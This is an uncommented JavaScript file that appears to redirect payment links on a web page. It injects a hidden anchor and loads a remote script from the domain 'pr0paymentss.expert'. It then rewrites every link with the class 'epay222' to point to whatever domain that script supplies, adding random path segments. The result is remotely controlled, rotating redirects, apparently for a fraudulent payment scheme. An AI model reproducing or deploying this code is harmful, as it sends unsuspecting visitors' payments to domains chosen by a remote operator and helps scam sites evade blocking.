getDomainDef();

function getDomainDef(){

          var oneElementHiddenLink = document.createElement("a");
          oneElementHiddenLink.setAttribute('class', 'KJXZ');
          oneElementHiddenLink.setAttribute('href', 'https://');
          oneElementHiddenLink.setAttribute('style', 'display:none;');
          oneElementHiddenLink.setAttribute('id', 'domainGeneralSSS');
          document.getElementsByTagName('body')[0].appendChild(oneElementHiddenLink);
          
          var twoElementScript = document.createElement("script");
          twoElementScript.setAttribute('type', 'text/javascript');
          twoElementScript.setAttribute('src', 'https://pr0paymentss.expert/buy_domain.php');
          document.getElementsByTagName('body')[0].appendChild(twoElementScript);
  
          var domain = "";
          var interValId = setInterval(function() {

             if(domain.length > 10) {
				proccess_main_urls('{"buy_domain":"'+domain+'"}');
                clearInterval(interValId);
                return false;
             }   
             
             domain = document.getElementById('domainGeneralSSS').getAttribute('href');
              
            },1);        
}

function proccess_main_urls(data) {
    var data = JSON.parse(data);
    var elem = document.getElementsByTagName("a");
    var gStr = strGen(13 + Math.ceil(Math.random() * 10));
    
    if(!(isEmpty(elem)))
    {
        for (var j = 0; j < elem.length; j++) {
            if(elem[j].className.indexOf("epay222") > -1){
                pathname_current =  elem[j].pathname;
                 pathname_current = pathname_current.replace('/b/','');
                 pathname_current = pathname_current.replace('/','');
                 pathname_current = '/b/'+gStr+'/'+pathname_current+'/';
                get_params = elem[j].search;
                elem[j].href = data.buy_domain + pathname_current + get_params;
            }
        }

    }
}

function isEmpty(obj) {
    if (obj.length == 0)
    {
        return true;
    }
    else{return false;}
}

function strGen(strLen) {
  var resStr = '';
  var symArray = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','0','1','2','3','4','5','6','7','8','9'];
  while(resStr.length < strLen) {
  resStr = resStr + symArray[Math.ceil((Math.random() * symArray.length) - 1)];
  }
  return resStr;
}